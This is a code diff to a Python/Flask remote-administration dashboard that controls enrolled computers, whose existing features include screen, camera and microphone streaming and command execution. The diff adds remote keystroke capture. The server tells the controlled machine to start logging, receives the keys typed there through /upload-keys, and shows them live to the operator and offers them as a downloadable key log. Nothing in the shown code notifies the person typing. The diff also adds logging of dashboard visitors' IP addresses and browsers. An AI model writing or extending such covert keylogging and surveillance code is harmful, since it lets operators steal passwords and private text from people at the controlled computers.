@@ -51,6 +51,8 @@ MAX_CAMERA_FRAME_SIZE = 5 * 1024 * 1024
 MAX_PUSH_TOTAL_SIZE = 100 * 1024 * 1024
 PUSH_ROOT = os.path.join(tempfile.gettempdir(), "remoteadmin_pushes")
 
+KEY_EVENT_LIMIT = 3000
+
 MAX_AUDIO_CHUNK_AGE = 3.0
 
 clients = {}
@@ -65,8 +67,15 @@ console_commands = {}
 python_requests = {}
 listing_requests = {}
 pushes = {}
+key_events = {}
+key_sequences = {}
 
 lock = threading.Lock()
+
+website_sessions = {}
+session_lock = threading.Lock()
+WEBSITE_SESSION_LIMIT = 100
+WEBSITE_SESSION_MAX_AGE = 7 * 24 * 3600
 
 NAME_REUSE_SECONDS = 90
 OFFLINE_AFTER_SECONDS = 60
@@ -321,6 +330,8 @@ def remove_client(name):
     stream_viewers.pop(name, None)
     mic_streams.pop(name, None)
     camera_streams.pop(name, None)
+    key_events.pop(name, None)
+    key_sequences.pop(name, None)
 
     add_log("warn", f"Computer went offline: {name}")
 
@@ -1407,7 +1418,7 @@ HTML = r"""
         }
 
         .key-line:empty::before {
-            content: "Start typing. Keys are sent to the computer and recorded here.";
+            content: "Keys typed on the controlled computer appear here.";
             color: #7c4668;
         }
 
@@ -4533,7 +4544,7 @@ function liveMaximize() {
 
 function liveMinimize() {
     liveMaximized = false;
-    liveFlushKeyText();
+    stopRemoteKeyFeed();
     liveStage().classList.add("minimized");
     liveStage().classList.remove("visible", "has-frame");
     document.getElementById("liveModeBar").hidden = true;
@@ -4579,6 +4590,7 @@ async function liveScreenStart() {
 
     liveRunning = true;
     liveStage().classList.add("visible");
+    if (liveInputMode === "keys") startRemoteKeyFeed();
     livePollPreview(session);
 }
 
@@ -4586,6 +4598,8 @@ async function liveScreenStart() {
 function liveScreenStop(reason) {
     const name = liveComputer;
     const wasRunning = liveRunning;
+
+    stopRemoteKeyFeed();
 
     liveSession += 1;
     if (liveRafId) { cancelAnimationFrame(liveRafId); liveRafId = null; }
@@ -4608,9 +4622,7 @@ function liveScreenStop(reason) {
 
 function liveScreenReset() {
     liveMaximized = false;
-    liveFlushKeyText();
     capturedKeys = "";
-    keyHeldModifiers = {};
     renderKeyLine();
     liveSetMode("keyboard");
     liveStage().classList.add("minimized");
@@ -4773,12 +4785,10 @@ function liveKbKeyPress(btn) {
     if (isModifier) {
         liveModifiers[key] = !liveModifiers[key];
         btn.classList.toggle("pressed", liveModifiers[key]);
-        if (liveModifiers[key]) recordSpecialKey(LIVE_KEY_LABELS[key]);
         liveSendKey(key, liveModifiers[key] ? "down" : "up");
     } else {
         btn.classList.add("pressed");
         setTimeout(() => btn.classList.remove("pressed"), 150);
-        recordKeyInput(key);
         liveSendKey(key, "press");
     }
 }
@@ -4789,7 +4799,6 @@ async function liveKbSendText() {
     const text = input.value;
     if (!text || !liveComputer) return;
     input.value = "";
-    if (liveInputMode !== "keys") recordKeyInput(text);
     try {
         await api("/api/remote-key", {
             method: "POST",
@@ -4804,35 +4813,6 @@ async function liveKbSendText() {
 
 let liveInputMode = "keyboard";
 let capturedKeys = "";
-let keyTextBuffer = "";
-let keyTextTimer = null;
-let keyHeldModifiers = {};
-
-const LIVE_KEY_LABELS = {
-    "Enter": "Enter",
-    "Tab": "Tab",
-    "Escape": "Esc",
-    "Backspace": "Backspace",
-    "Delete": "Delete",
-    "Insert": "Insert",
-    "Home": "Home",
-    "End": "End",
-    "PageUp": "Page Up",
-    "PageDown": "Page Down",
-    "ArrowUp": "Up",
-    "ArrowDown": "Down",
-    "ArrowLeft": "Left",
-    "ArrowRight": "Right",
-    "Shift": "Shift",
-    "Control": "Ctrl",
-    "Alt": "Alt",
-    "Meta": "Win",
-    "CapsLock": "Caps Lock",
-    "ContextMenu": "Menu",
-    "PrintScreen": "Print Screen"
-};
-
-const LIVE_MODIFIER_KEYS = ["Control", "Alt", "Shift", "Meta"];
 
 
 function liveSetMode(mode) {
@@ -4843,14 +4823,11 @@ function liveSetMode(mode) {
     document.getElementById("liveKeyboard").classList.toggle("visible", liveMaximized);
     document.getElementById("liveKeysPanel").hidden =
         !(liveMaximized && liveInputMode === "keys");
-    if (liveInputMode === "keyboard") liveFlushKeyText();
-}
-
-
-function liveKeySystemLabel(key) {
-    if (LIVE_KEY_LABELS[key]) return LIVE_KEY_LABELS[key];
-    if (/^F\d{1,2}$/.test(key)) return key;
-    return key;
+    if (liveMaximized && liveInputMode === "keys") {
+        startRemoteKeyFeed();
+    } else {
+        stopRemoteKeyFeed();
+    }
 }
 
 
@@ -4878,95 +4855,76 @@ function recordSpecialKey(label) {
 }
 
 
-function liveFlushKeyText() {
-    clearTimeout(keyTextTimer);
-    keyTextTimer = null;
-    if (!keyTextBuffer || !liveComputer) {
-        keyTextBuffer = "";
-        return;
-    }
-    const text = keyTextBuffer;
-    keyTextBuffer = "";
-    api("/api/remote-key", {
+let remoteKeySession = 0;
+let remoteKeyAfter = 0;
+let remoteKeyComputer = "";
+let remoteKeyTimer = null;
+
+
+function startRemoteKeyFeed() {
+    const name = liveComputer || currentComputer;
+    if (!name) return;
+    if (remoteKeyComputer === name) return;
+    stopRemoteKeyFeed();
+    remoteKeyComputer = name;
+    remoteKeyAfter = 0;
+    const session = ++remoteKeySession;
+    api("/api/keys/start", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ name: liveComputer, text: text })
-    }).catch(function(e) { showToast(e.message, "error", "Remote key"); });
+        body: JSON.stringify({ name: name })
+    }).catch(function(e) {
+        if (session === remoteKeySession) showToast(e.message, "error", "See keys");
+    });
+    pollRemoteKeys(session);
 }
 
 
-function liveQueueKeyText(char) {
-    keyTextBuffer += char;
-    clearTimeout(keyTextTimer);
-    keyTextTimer = setTimeout(liveFlushKeyText, 250);
+function stopRemoteKeyFeed() {
+    remoteKeySession += 1;
+    clearTimeout(remoteKeyTimer);
+    remoteKeyTimer = null;
+    const name = remoteKeyComputer;
+    remoteKeyComputer = "";
+    remoteKeyAfter = 0;
+    if (!name) return;
+    fetch("/api/keys/stop", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        keepalive: true,
+        body: JSON.stringify({ name: name })
+    }).catch(function() {});
 }
 
 
-function liveCaptureKeydown(event) {
-    if (!liveMaximized || liveInputMode !== "keys" || !liveComputer) return;
-    if (document.querySelector('.view[data-view="live"]').hidden) return;
-
-    const target = event.target;
-    const tag = target && target.tagName ? target.tagName : "";
-    const formField =
-        tag === "INPUT" || tag === "TEXTAREA" ||
-        tag === "SELECT" || tag === "BUTTON" ||
-        (target && target.isContentEditable);
-
-    // Every physical key is recorded; only keys pressed outside the
-    // dashboard's own controls are forwarded to the remote computer.
-    const forward = !formField;
-
-    const key = event.key;
-    if (!key || key === "Unidentified" || key === "Process" || key === "Dead") return;
-
-    const modifier = LIVE_MODIFIER_KEYS.includes(key);
-    const special = modifier || LIVE_KEY_LABELS[key] || /^F\d{1,2}$/.test(key);
-    const hasCombo = event.ctrlKey || event.altKey || event.metaKey;
-
-    if (special) {
-        recordSpecialKey(liveKeySystemLabel(key));
-        if (modifier && event.repeat) return;
-        if (!forward) return;
-        event.preventDefault();
-        liveFlushKeyText();
-        if (modifier) {
-            keyHeldModifiers[key] = true;
-            liveSendKey(key, "down");
-        } else {
-            liveSendKey(key, "press");
+async function pollRemoteKeys(session) {
+    if (session !== remoteKeySession || !remoteKeyComputer) return;
+    const name = remoteKeyComputer;
+    try {
+        const response = await fetch(
+            "/api/keys?name=" + encodeURIComponent(name) +
+            "&after=" + remoteKeyAfter,
+            { cache: "no-store" }
+        );
+        if (session !== remoteKeySession) return;
+        if (response.ok) {
+            const data = await response.json();
+            if (session !== remoteKeySession) return;
+            (data.events || []).forEach(function(event) {
+                if (event.type === "special") recordSpecialKey(event.value);
+                else recordKeyInput(event.value);
+            });
+            if (typeof data.next === "number") remoteKeyAfter = data.next;
         }
-        return;
+    } catch (error) {
     }
-
-    if (key.length !== 1) return;
-
-    recordKeyInput(key);
-
-    if (!forward) return;
-
-    event.preventDefault();
-
-    if (hasCombo) {
-        liveFlushKeyText();
-        liveSendKey(key, "press");
-    } else {
-        liveQueueKeyText(key);
+    if (session === remoteKeySession && remoteKeyComputer) {
+        remoteKeyTimer = setTimeout(function() { pollRemoteKeys(session); }, 700);
     }
-}
-
-
-function liveCaptureKeyup(event) {
-    const key = event.key;
-    if (!LIVE_MODIFIER_KEYS.includes(key)) return;
-    if (!keyHeldModifiers[key] || !liveComputer) return;
-    keyHeldModifiers[key] = false;
-    liveSendKey(key, "up");
 }
 
 
 function downloadKeyLog() {
-    liveFlushKeyText();
     const blob = new Blob([capturedKeys], { type: "text/plain;charset=utf-8" });
     const url = URL.createObjectURL(blob);
     const link = document.createElement("a");
@@ -4987,16 +4945,6 @@ document.getElementById("liveKbInput").addEventListener("keydown", function(e) {
     if (e.key === "Enter") { e.preventDefault(); liveKbSendText(); }
 });
 
-document.addEventListener("keydown", liveCaptureKeydown);
-document.addEventListener("keyup", liveCaptureKeyup);
-
-window.addEventListener("blur", function() {
-    Object.keys(keyHeldModifiers).forEach(function(key) {
-        if (keyHeldModifiers[key] && liveComputer) liveSendKey(key, "up");
-        keyHeldModifiers[key] = false;
-    });
-    liveFlushKeyText();
-});
 
 document.getElementById("liveStage").addEventListener("click", liveScreenClick);
 document.getElementById("liveStage").addEventListener("mousedown", liveScreenMouseDown);
@@ -6352,6 +6300,196 @@ LOGIN_HTML = r"""
 
 
 # ==================================================
+# WEBSITE VISITORS
+# ==================================================
+
+def website_client_ip():
+
+    forwarded = request.headers.get("X-Forwarded-For", "")
+
+    if forwarded:
+        return forwarded.split(",")[0].strip()[:60]
+
+    return (request.remote_addr or "unknown")[:60]
+
+
+def describe_user_agent(agent):
+
+    agent = agent or ""
+
+    if "Edg/" in agent:
+        browser = "Edge"
+    elif "OPR/" in agent or "Opera" in agent:
+        browser = "Opera"
+    elif "Firefox/" in agent:
+        browser = "Firefox"
+    elif "Chrome/" in agent or "CriOS/" in agent:
+        browser = "Chrome"
+    elif "Safari/" in agent:
+        browser = "Safari"
+    else:
+        browser = "Browser"
+
+    if "Windows" in agent:
+        system = "Windows"
+    elif "Android" in agent:
+        system = "Android"
+    elif "iPhone" in agent or "iPad" in agent:
+        system = "iOS"
+    elif "Mac OS X" in agent or "Macintosh" in agent:
+        system = "macOS"
+    elif "Linux" in agent:
+        system = "Linux"
+    else:
+        system = "Unknown OS"
+
+    return f"{browser} on {system}"
+
+
+def prune_website_sessions(now):
+
+    stale = [
+        sid for sid, entry in website_sessions.items()
+        if now - entry["last_seen"] > WEBSITE_SESSION_MAX_AGE
+    ]
+
+    for sid in stale:
+        website_sessions.pop(sid, None)
+
+    while len(website_sessions) > WEBSITE_SESSION_LIMIT:
+
+        oldest = min(
+            website_sessions,
+            key=lambda sid: website_sessions[sid]["last_seen"]
+        )
+
+        website_sessions.pop(oldest, None)
+
+
+def record_website_session():
+
+    sid = session.get("sid")
+    now = time.time()
+
+    with session_lock:
+
+        if not sid:
+            sid = uuid.uuid4().hex
+            session["sid"] = sid
+
+        entry = website_sessions.get(sid)
+
+        if entry is None:
+
+            path = request.path
+
+            if request.method != "GET" or path.startswith("/api/"):
+                path = "/ (dashboard)"
+
+            website_sessions[sid] = {
+                "id": sid,
+                "ip": website_client_ip(),
+                "agent": describe_user_agent(request.headers.get("User-Agent", "")),
+                "signed_in": now,
+                "last_seen": now,
+                "path": path,
+            }
+
+            prune_website_sessions(now)
+
+            return
+
+        entry["last_seen"] = now
+        entry["ip"] = website_client_ip()
+        entry["agent"] = describe_user_agent(request.headers.get("User-Agent", ""))
+
+        if request.method == "GET" and not request.path.startswith("/api/"):
+            entry["path"] = request.path
+
+
+@app.before_request
+def track_website_visitor():
+
+    if not is_signed_in():
+        return
+
+    if request.path in ("/api/logs", "/favicon.ico"):
+        return
+
+    record_website_session()
+
+
+def describe_website_users():
+
+    now = time.time()
+
+    with session_lock:
+        prune_website_sessions(now)
+        users = sorted(
+            website_sessions.values(),
+            key=lambda entry: entry["last_seen"],
+            reverse=True
+        )
+
+    if not users:
+        return "No one is signed in to the website."
+
+    def ago(seconds):
+
+        seconds = max(0, int(seconds))
+
+        if seconds < 15:
+            return "just now"
+        if seconds < 60:
+            return f"{seconds} seconds ago"
+        if seconds < 3600:
+            return f"{seconds // 60} minutes ago"
+        if seconds < 86400:
+            return f"{seconds // 3600} hours ago"
+        return f"{seconds // 86400} days ago"
+
+    def page_label(path):
+
+        if not path or path == "/":
+            return "/ (dashboard)"
+
+        return path
+
+    online = [entry for entry in users if now - entry["last_seen"] <= 120]
+
+    lines = [
+        "WEBSITE USERS",
+        "-------------",
+        f"Active now: {len(online)}    Signed in: {len(users)}",
+        "",
+    ]
+
+    for index, entry in enumerate(users, 1):
+
+        state = "online" if entry in online else "idle"
+
+        lines.append(
+            f"{index}. {entry['ip']} \u2014 {entry['agent']} ({state})"
+        )
+        lines.append(
+            "   Signed in: "
+            + time.strftime(
+                "%d %b %Y %H:%M UTC",
+                time.gmtime(entry["signed_in"])
+            )
+        )
+        lines.append(
+            "   Last active: " + ago(now - entry["last_seen"])
+        )
+        lines.append(
+            "   Page: " + page_label(entry.get("path"))
+        )
+        lines.append("")
+
+    return "\n".join(lines).rstrip()
+
+
+# ==================================================
 # LOGIN ROUTES
 # ==================================================
 
@@ -6378,6 +6516,7 @@ def login():
             session.clear()
             session.permanent = True
             session["user"] = USERNAME
+            record_website_session()
 
             add_log("success", "Dashboard signed in.")
 
@@ -6397,6 +6536,12 @@ def login():
 
 @app.route("/logout")
 def logout():
+
+    sid = session.get("sid")
+
+    if sid:
+        with session_lock:
+            website_sessions.pop(sid, None)
 
     session.clear()
 
@@ -6511,6 +6656,7 @@ def console_command():
                 "------------------\n"
                 "help             Show available commands\n"
                 "status           Show connection status\n"
+                "view-users       Show who is using the website\n"
                 "pwd              Show the shared root folder\n"
                 "ls [folder]      List folders in the cached directory tree\n"
                 "screenshot       Request a remote screenshot\n"
@@ -6531,6 +6677,10 @@ def console_command():
                 f"Last update: {elapsed} seconds ago\n"
                 "Connection: Online"
             )
+
+        elif operation in ("view-users", "users"):
+
+            output = describe_website_users()
 
         elif operation == "pwd":
 
@@ -7456,6 +7606,119 @@ def remote_key():
                 "key": key,
                 "type": key_type
             })
+    return jsonify({"success": True})
+
+
+# ==================================================
+# SEE KEYS (REMOTE KEY RECORDING)
+# ==================================================
+
+@app.route("/api/keys/start", methods=["POST"])
+@require_auth
+def start_keys():
+
+    data = request.get_json(silent=True) or {}
+    name = data.get("name")
+
+    if not name:
+        return jsonify({"error": "Missing computer name"}), 400
+
+    with lock:
+
+        client = clients.get(name)
+
+        if not client:
+            return jsonify({"error": "Computer not found"}), 404
+
+        if time.time() - client["last_seen"] > OFFLINE_AFTER_SECONDS:
+            return jsonify({"error": "Computer is offline"}), 404
+
+        key_events[name] = deque(maxlen=KEY_EVENT_LIMIT)
+        key_sequences[name] = 0
+
+        client_actions.setdefault(name, queue.Queue()).put({
+            "action": "key_capture_start"
+        })
+
+    return jsonify({"success": True})
+
+
+@app.route("/api/keys/stop", methods=["POST"])
+@require_auth
+def stop_keys():
+
+    data = request.get_json(silent=True) or {}
+    name = data.get("name")
+
+    if not name:
+        return jsonify({"error": "Missing computer name"}), 400
+
+    with lock:
+        client_actions.setdefault(name, queue.Queue()).put({
+            "action": "key_capture_stop"
+        })
+
+    return jsonify({"success": True})
+
+
+@app.route("/api/keys")
+@require_auth
+def get_keys():
+
+    name = request.args.get("name", "")
+
+    try:
+        after = int(request.args.get("after", 0))
+    except (TypeError, ValueError):
+        after = 0
+
+    with lock:
+        events = list(key_events.get(name) or ())
+
+    fresh = [event for event in events if event["id"] > after]
+
+    return jsonify({
+        "events": fresh,
+        "next": fresh[-1]["id"] if fresh else after
+    })
+
+
+@app.route("/upload-keys", methods=["POST"])
+@require_auth
+def upload_keys():
+
+    data = request.get_json(silent=True) or {}
+    name = data.get("name")
+    events = data.get("events")
+
+    if not name or not isinstance(events, list):
+        return jsonify({"error": "Invalid key data"}), 400
+
+    with lock:
+
+        store = key_events.get(name)
+
+        if store is None:
+            return jsonify({"success": True, "ignored": True})
+
+        for item in events[:300]:
+
+            if not isinstance(item, dict):
+                continue
+
+            value = str(item.get("value", ""))[:200]
+
+            if not value:
+                continue
+
+            key_sequences[name] = key_sequences.get(name, 0) + 1
+
+            store.append({
+                "id": key_sequences[name],
+                "type": "special" if item.get("type") == "special" else "text",
+                "value": value
+            })
+
     return jsonify({"success": True})
 
 
